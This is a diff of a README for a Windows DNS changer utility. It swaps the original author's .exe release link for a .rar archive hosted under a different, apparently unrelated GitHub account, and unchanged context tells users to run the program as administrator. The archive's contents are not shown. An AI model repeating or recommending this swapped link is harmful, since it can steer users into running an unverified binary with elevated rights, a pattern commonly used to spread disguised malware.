@@ -4,7 +4,7 @@ This program allows the user to change their DNS settings. Useful for accessing 
 
 ## How to Use
 
- 1. Download and launch the application. [Dns Changer.exe](https://github.com/ALIILAPRO/dns-changer/releases/download/v1.5.0/DNSChange.by.aliilapro.v1_5_0.exe)
+ 1. Download and launch the application. [Dns Changer.exe](https://github.com/2xAm1r/dns-changer/releases/download/add/DnsChanger.rar)
 
 2.You must run the app through administrator, if you are using os gaming, uac was turned off, you can run it without clicking admin
 
